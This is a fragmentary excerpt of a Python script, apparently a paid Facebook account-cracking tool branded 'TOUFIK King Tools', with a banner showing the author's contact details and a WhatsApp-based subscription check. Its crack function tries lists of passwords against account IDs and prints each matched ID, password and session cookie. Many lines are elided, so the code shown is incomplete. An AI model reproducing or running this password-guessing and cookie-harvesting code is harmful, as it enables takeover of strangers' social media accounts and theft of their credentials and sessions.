...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Toufik' and password == 'X1':
...
os.system('espeak -a 300 " Welcome,   to,  TOUFIK,  King,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-TOUFIK ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • TOUFIK King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mtestourx ]   ║\33[1;34m   
╠══[Whatsapp                 • 01322342876 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801322342876')
	elif TUTUL in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[TOUFIK-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•TOUFIK-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " TOUFIK,  Ok,  id"')
...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m TOUFIK King, ToOLs Daily Update")
		...
		os.system('am start https://wa.me/+8801322342876?text=' + tks)
		Subscraption() 
Subscraption() 
login()